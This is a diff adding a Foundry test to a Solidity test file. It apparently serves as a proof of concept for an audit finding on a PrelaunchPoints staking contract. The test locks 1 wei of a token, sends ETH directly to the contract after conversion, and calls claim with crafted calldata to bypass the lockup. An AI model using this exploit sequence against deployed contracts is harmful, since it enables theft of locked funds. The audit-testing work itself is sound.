@@ -47,6 +47,40 @@ contract PrelaunchPointsTest is Test {
         attackContract = new AttackContract(prelaunchPoints);
     }
 
+    function test_deposit_lockup_bypass() public {
+        uint256 lockAmount = 1;
+        address attacker = makeAddr("attacker");
+
+        vm.startPrank(attacker);
+        lrt.mint(attacker, lockAmount);
+        lrt.approve(address(prelaunchPoints), lockAmount);
+        prelaunchPoints.lock(address(lrt), lockAmount, "");
+        vm.stopPrank();
+
+        // Set Loop Contracts and Convert to lpETH
+        prelaunchPoints.setLoopAddresses(address(lpETH), address(lpETHVault));
+        // Locking period ends
+        vm.warp(prelaunchPoints.loopActivation() + prelaunchPoints.TIMELOCK() + 1);
+        prelaunchPoints.convertAllETH();
+        vm.warp(prelaunchPoints.startClaimDate() + 1);
+
+        uint256 largeEthAmount = 10 ether;
+        vm.deal(attacker, largeEthAmount);
+        vm.startPrank(attacker);
+        (bool success,) = address(prelaunchPoints).call{value: largeEthAmount}("");
+        require(success, "Call failed");
+        prelaunchPoints.claim(
+            address(lrt),
+            uint8(lockAmount),
+            PrelaunchPoints.Exchange.TransformERC20,
+            abi.encodeWithSelector(prelaunchPoints.TRANSFORM_SELECTOR(), address(lrt), address(ETH), lockAmount / 100)
+        );
+        vm.stopPrank();
+
+        uint256 attackerEndingBalance = lpETH.balanceOf(attacker);
+        assertEq(attackerEndingBalance, largeEthAmount);
+    }
+
     /// ======= Tests for lockETH ======= ///
     function testLockETH(uint256 lockAmount) public {
         vm.assume(lockAmount > 0);
